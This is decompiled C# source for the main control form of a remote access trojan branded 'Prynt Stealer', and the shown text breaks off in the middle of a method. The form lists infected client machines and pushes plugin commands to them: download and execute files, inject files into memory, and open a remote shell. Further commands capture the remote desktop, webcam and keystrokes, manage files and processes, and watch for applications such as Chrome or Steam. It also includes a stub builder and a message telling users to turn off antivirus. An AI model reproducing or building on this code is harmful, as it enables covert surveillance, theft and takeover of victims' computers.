﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace Server
{
	// Token: 0x0200000E RID: 14
	public partial class Form1 : Form
	{
		// Token: 0x06000054 RID: 84 RVA: 0x00005B7C File Offset: 0x00003D7C
		public Form1()
		{
			this.InitializeComponent();
			Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
			base.Opacity = 0.0;
			this.formDOS = new FormDOS
			{
				Name = "DOS",
				Text = "DOS"
			};
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00005BE8 File Offset: 0x00003DE8
		private void CheckFiles()
		{
			try
			{
				if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
				{
					MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
					Environment.Exit(0);
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
				{
					MessageBox.Show("Missing client file,please close the Anti-virus and unzip again.");
				}
				if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
				{
					Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Prynt Stealer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00005CC8 File Offset: 0x00003EC8
		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.SelectedItems.Count != 0)
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00005D0C File Offset: 0x00003F0C
		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.Items.Count != 0)
					{
						foreach (object obj in this.listView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00005D50 File Offset: 0x00003F50
		private void Connect()
		{
			Form1.<Connect>d__8 <Connect>d__;
			<Connect>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Connect>d__.<>1__state = -1;
			<Connect>d__.<>t__builder.Start<Form1.<Connect>d__8>(ref <Connect>d__);
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005D80 File Offset: 0x00003F80
		private void Form1_Load(object sender, EventArgs e)
		{
			Form1.<Form1_Load>d__9 <Form1_Load>d__;
			<Form1_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Form1_Load>d__.<>4__this = this;
			<Form1_Load>d__.<>1__state = -1;
			<Form1_Load>d__.<>t__builder.Start<Form1.<Form1_Load>d__9>(ref <Form1_Load>d__);
		}

		// Token: 0x0600005A RID: 90 RVA: 0x000021EF File Offset: 0x000003EF
		private void Form1_Activated(object sender, EventArgs e)
		{
			if (this.trans)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00002208 File Offset: 0x00000408
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002219 File Offset: 0x00000419
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00005DB8 File Offset: 0x00003FB8
		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
			{
				foreach (object obj in this.listView1.Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00005E40 File Offset: 0x00004040
		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005EB0 File Offset: 0x000040B0
		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == this.lvwColumnSorter.SortColumn)
			{
				if (this.lvwColumnSorter.Order == SortOrder.Ascending)
				{
					this.lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					this.lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				this.lvwColumnSorter.SortColumn = e.Column;
				this.lvwColumnSorter.Order = SortOrder.Ascending;
			}
			this.listView1.Sort();
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00005F24 File Offset: 0x00004124
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			if (Settings.Default.Notification)
			{
				Settings.Default.Notification = false;
				this.toolStripStatusLabel2.ForeColor = Color.Black;
			}
			else
			{
				Settings.Default.Notification = true;
				this.toolStripStatusLabel2.ForeColor = Color.Green;
			}
			Settings.Default.Save();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005F80 File Offset: 0x00004180
		private void ping_Tick(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00006004 File Offset: 0x00004204
		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			object lockListviewClients = Settings.LockListviewClients;
			lock (lockListviewClients)
			{
				this.toolStripStatusLabel1.Text = string.Format("Online {0}     Selected {1}                    Sent {2}     Received  {3}                    CPU {4}%     Memory {5}%", new object[]
				{
					this.listView1.Items.Count.ToString(),
					this.listView1.SelectedItems.Count.ToString(),
					Methods.BytesToString(Settings.SentValue).ToString(),
					Methods.BytesToString(Settings.ReceivedValue).ToString(),
					(int)this.performanceCounter1.NextValue(),
					(int)this.performanceCounter2.NextValue()
				});
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000060FC File Offset: 0x000042FC
		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00006160 File Offset: 0x00004360
		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00006218 File Offset: 0x00004418
		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
					foreach (object obj in this.listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack.Encode2Bytes());
					}
				}
				this.listView3.Items.Clear();
				this.ThumbnailImageList.Images.Clear();
				foreach (object obj2 in this.listView1.Items)
				{
					((Clients)((ListViewItem)obj2).Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006344 File Offset: 0x00004544
		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView4.SelectedItems.Count > 0)
			{
				foreach (object obj in this.listView4.SelectedItems)
				{
					((ListViewItem)obj).Remove();
				}
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000063B4 File Offset: 0x000045B4
		private void TimerTask_Tick(object sender, EventArgs e)
		{
			Form1.<TimerTask_Tick>d__23 <TimerTask_Tick>d__;
			<TimerTask_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<TimerTask_Tick>d__.<>4__this = this;
			<TimerTask_Tick>d__.<>1__state = -1;
			<TimerTask_Tick>d__.<>t__builder.Start<Form1.<TimerTask_Tick>d__23>(ref <TimerTask_Tick>d__);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000063EC File Offset: 0x000045EC
		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("Update").AsString = "false";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000065FC File Offset: 0x000047FC
		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00006864 File Offset: 0x00004A64
		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00006A74 File Offset: 0x00004C74
		private bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00006AE4 File Offset: 0x00004CE4
		private void SetExecution(string id)
		{
			foreach (object obj in Program.form1.listView4.Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (listViewItem.ToolTipText == id)
				{
					int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
					num++;
					listViewItem.SubItems[1].Text = num.ToString();
				}
			}
		}

		// Token: 0x0600006D RID: 109
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x0600006E RID: 110 RVA: 0x00006B80 File Offset: 0x00004D80
		private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00006BB8 File Offset: 0x00004DB8
		private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (FormAbout formAbout = new FormAbout())
			{
				formAbout.ShowDialog();
			}
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00006BF0 File Offset: 0x00004DF0
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00006C24 File Offset: 0x00004E24
		private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						new FormShell
						{
							Name = "shell:" + clients.ID,
							Text = "shell:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00006D5C File Offset: 0x00004F5C
		private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						new FormRemoteDesktop
						{
							Name = "RemoteDesktop:" + clients.ID,
							F = this,
							Text = "RemoteDesktop:" + clients.ID,
							ParentClient = clients,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00006E7C File Offset: 0x0000507C
		private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
					foreach (Clients clients in this.GetSelectedClients())
					{
						if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
						{
							new FormWebcam
							{
								Name = "Webcam:" + clients.ID,
								F = this,
								Text = "Webcam:" + clients.ID,
								ParentClient = clients,
								FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
							}.Show();
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00006FBC File Offset: 0x000051BC
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						new FormFileManager
						{
							Name = "fileManager:" + clients.ID,
							Text = "fileManager:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000070D0 File Offset: 0x000052D0
		private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						new FormProcessManager
						{
							Name = "processManager:" + clients.ID,
							Text = "processManager:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000071D0 File Offset: 0x000053D0
		private void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Form1.<SendFileToDiskToolStripMenuItem_Click>d__38 <SendFileToDiskToolStripMenuItem_Click>d__;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SendFileToDiskToolStripMenuItem_Click>d__.<>4__this = this;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>1__state = -1;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder.Start<Form1.<SendFileToDiskToolStripMenuItem_Click>d__38>(ref <SendFileToDiskToolStripMenuItem_Click>d__);
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00007208 File Offset: 0x00005408
		private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00007378 File Offset: 0x00005578
		private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "Controlled by Prynt Stealer", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00007474 File Offset: 0x00005674
		private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
					{
						new FormChat
						{
							Name = "chat:" + clients.ID,
							Text = "chat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00007520 File Offset: 0x00005720
		private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000761C File Offset: 0x0000581C
		private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (OpenFileDialog openFileDialog = new OpenFileDialog())
					{
						openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
						if (openFileDialog.ShowDialog() == DialogResult.OK)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
							msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
							msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							Clients[] selectedClients = this.GetSelectedClients();
							for (int i = 0; i < selectedClients.Length; i++)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x0000777C File Offset: 0x0000597C
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						new FormKeylogger
						{
							Name = "keyLogger:" + clients.ID,
							Text = "keyLogger:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00007894 File Offset: 0x00005A94
		private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					object lockReportWindowClients = Settings.LockReportWindowClients;
					lock (lockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
